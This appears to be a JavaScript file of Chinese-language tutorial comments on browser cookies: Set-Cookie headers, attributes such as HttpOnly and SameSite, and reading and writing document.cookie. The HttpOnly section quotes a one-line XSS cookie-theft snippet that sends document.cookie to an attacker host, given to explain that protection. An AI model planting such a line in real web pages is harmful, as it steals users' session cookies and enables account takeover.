/**
 * * 什么是 Cookie：
 *    Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不超过 4kb。浏览器每次向服务器发出请求，就会自动附上这段信息。
 * * 用途：主要是保存状态信息
 *    1.对话(session)管理：保存登陆，购物车等需要记录的信息
 *    2.个性化信息：保存用户的偏好，比如网页的字体大小，背景色等
 *    3.追踪用户：记录和分析用户行为
 * * 缺点：Cookie 不是一种理想的客户端存储机制。它的容量很小，缺乏数据操作接口，而且会影响性能。
 *        客户端存储应该使用 Web storage API 和 IndexedDB。
 *        只有那些每次都需要让服务器知道的信息，才应该放在 Cookie 里面。
 * * Cookie 的构成：
 *    1.Cookie 的名字
 *    2.Cookie 的值(真正的数据写在这里面)
 *    3.到期时间（超过时间会失效）
 *    4.所属域名（默认为当前路径）
 *    5.生效的路径（默认为当前网址）
 * * 浏览器设置是否接受或发送Cookie：
 *    window.navigator.cookieEnabled = true // 表示浏览器打开 Cookie功能
 *    document.cookie 属性返回当前网页的 Cookie // 'id=foo;key=bar'
 * * Cookie限制：
 *    1.不同浏览器对 Cookie 数量和大小的限制不同。
 *    2.一般单个域名设置的 Cookie 不超过30个，每个 Cookie 的大小不超过4KB。
 *    3.超过以后，Cookie 将被忽略，不会被设置。
 *    4.浏览器同源策略规定，两个网址只要域名相同，就可以共享 Cookie，
 *      不需要协议相同。http://example.com 设置的 Cookie ，可以被 https://example.com 读取
 */

/**
 * * Cookie 和 HTTP协议的关系：Cookie 由 HTTP 协议生成，也主要提供 HTTP 协议使用
 * * Cookie 的生成：
 *    1. 服务器如果想要在浏览器保存 Cookie，就要在 HTTP 响应头信息里面，放置一个 Set-Cookie 字段。
 *       例如：Set-Cookie:foo=bar(表示在浏览器中保存一个名为 foo 的Cookie，它的值为 bar)
 *    2. HTTP 响应头里可以包含多个 Set-Cookie 字段，即在浏览器生成多个 Cookie。例：
 *       HTTP/1.0 200 OK
 *       Content-type: text/html
 *       Set-Cookie: yummy_cookie=choco
 *       Set-Cookie: tasty_cookie=strawberry
 *    3. 除了 Cookie 的值，Set-Cookie 字段还可以附加 Cookie 的属性,每个属性用 ; 隔开，没有次序要求。例：
 *       Set-Cookie: name=value; Expires=date(过期时间)
 *       Set-Cookie: name=value; Max-Age=non-zero-digit(cookie持续时间)
 *       Set-Cookie: name=value; Domain=domain-value(域名)
 *       Set-Cookie: name=value; Path=path-value(路径)
 *       Set-Cookie: name=value; Secure(安全)
 *       Set-Cookie: name=value; HttpOnly(只允许在HTTP中生成)
 *    4. 修改 Cookie 需要满足的条件：Cookie 的 key，domain，path 和 secure 都匹配。例：
 *       原始 Cookie： Set-Cookie: key1=value1; domain=example.com; path=/blog
 *       修改 Cookie： Set-Cookie: key1=value2; domain=example.com; path=/blog
 *       只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。例：
 *       修改 Cookie： Set-Cookie: key1=value2; domain=example.com; path=/
 *       由于 path 属性不同，下次访问 example.com/blog 的时候，浏览器会向服务器发送两个同名的 Cookie。
 *       Cookie: key1=value1; key1=value2
 * * Cookie 的发送：
 *    浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器之前保存在浏览器的这段信息，再发回服务自。
 *    需要使用到 HTTP 请求头信息的 Cookie 字段。
 *    1. Cookie: foo=bar(浏览器会向服务器发送名为 foo 的Cookie，值为 bar)
 *    2. Cookie 字段可以包含多个 Cookie，使用 ; 分隔。
 *       例：Cookie: name=value; name1=value1; name2=value2
 *    注意：服务器收到浏览器发送来的 Cookie 时，有两点是无法知道的：
 *         1. Cookie 的各种属性，比如何时过期。
 *         2. 哪个域名设置的 Cookie，到底是一级域名设置的，还是某一个二级域名设置的。
 */

/**
 * * Cookie 的属性:
 *   1.Expires: 设置一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。
 *       它的值的格式是 UTC 格式，可以使用 Date.prototype.toUTCString()进行格式转换。
 *       例如：Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 *       如果没有设置该属性，则或设置为null，Cookie 只在当前会话(session)有效，浏览器一旦关闭，当前
 *       session结束，该Cookie就会被删除。
 *       浏览器是根据本地时间，决定 Cookie是否过期，由于本地时间是不精确的，因此没有办法保证 Cookie 一定会在
 *       服务器的指定时间过期。
 *   2.Max-Age：指定从现在开始 Cookie 存在的秒数，如 60 * 60 * 24 * 365(一年)。
 *       过了这段时间以后，浏览器就不再保留这个 Cookie。Max-Age 优先级高于 Expires
 *   3.Domain: 指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。
 *       如果没有指定该属性，浏览器会默认将其设置为当前域名，这时子域名将不会附带这个 Cookie。
 *       例如：example.com 不设置Cookie的 domain 属性，那么 sub.example.com 将不会附带这个 Cookie，
 *            反之则会附带。
 *   4.Path: 指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只有浏览器发现，path属于 HTTP 请求路径的
 *       开头一部分，就会在头信息里面带上这个 Cookie。比如： Path 属性是 / ，那么请求 /docs 路径也会包含该 Cookie。
 *       前提是域名一致。
 *   5.Secure: 指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。如果当前协议是 HTTP，浏览器会自动忽略
 *       服务器发送多来的 Secure 属性。 该属性就是一个开关，无需设置指定值。如果通信是 HTTPS 协议，则开关会自动打开。
 *   6.HttpOnly: 指定该 Cookie 无法通过 JavaScript 脚本拿到。如 document.cookie，XMLHTTPRequest 对象和 Request API 都拿不到该属性。
 *       这样可以防止该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
 *       例如：(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie
 *       该代码是跨站点载入的一个恶意脚本代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置一个 Cookie 的 HttpOnly 属性，
 *       则就不会读取到该 Cookie。
 *   7.SameSite: Chrome 51开始，浏览器的 Cookie 新增了一个 SameSite 属性，用于防止 CSRF 攻击和用户追踪。
 *       CSRF 攻击：Cookie 往往用于存储用户的身份信息，恶意网站就会设法伪造带有正确 Cookie 的 HTTP 请求。
 *     SameSite 属性值：
 *       - Strict：最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。只有当前网页的 URL 与请求的目标一致时，才会带上 Cookie。
 *                 例：Set-Cookie: CookieName=CookieValue; SameSite=Strict;
 *       - Lax: 规则稍微放款，大多数情况下也不允许发送 Cookie，但是导航到目标网址的 Get 请求除外。
 *              Set-Cookie: CookieName=CookieValue; SameSite=Lax;
 *              导航目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。
 *              - 链接：<a href="..."></a>
 *              - 预加载：<link rel="prerender" href="..." />
 *              - GET表单：<form method="GET" action="..." />
 *       - None: Chrome 将 Lax 设置为默认值，因此网站可以显式关闭 SameSite 属性，将其设置为 None。
 *               不过必须同时设置 Secure 属性，否则无效。
 *               例：Set-Cookie: widget_session=abc123; SameSite=None (无效)
 *                  Set-Cookie: widget_session=abc123; SameSite=None; Secure （有效）
 *  
 */

/**
 * * document.cookie：返回当前网页所有的 Cookie，前提是该 Cookie不具有 HttpOnly 属性
 * * document.cookie 是可写的，可以通过它为当前网站添加 Cookie。例：document.cookie = 'fontSize=14'
 *   写入的时候，Cookie 的值必须是 key=value 的形式，等号两边不能有空格。另外，写入Cookie的时候，
 *   必须对 分号，逗号和空格进行转义(它们都不允许作为 Cookie 的值)，可以使用 encodeURIComponent
 * * document.cookie 一次只能写入一个 Cookie，写入都是添加，而不能覆盖。
 * * document.cookie 读写：
 *    读：一次可以读出全部 Cookie
 *    写：一次只能写入一个 Cookie, 例子：
 *       document.cookie = 'fontSize=14; '
 *         + 'expires=' + someDate.toGMTString() + '; '
 *         + 'path=/subdirectory; '
 *         + 'domain=*.example.com'
 * * 删除 cookie 的唯一方法：设置它的 expires 属性为一个过去的日期。例如：
 *    document.cookie = 'fontSize=; expires=Thu, 01-Jan-1970 00:00:01 GMT'
 *    解释：名为 fontSize 的 Cookie 的值为空，过期时间设置为1970年1月1日零点，就等同于删除这个 Cookie
 *       
 */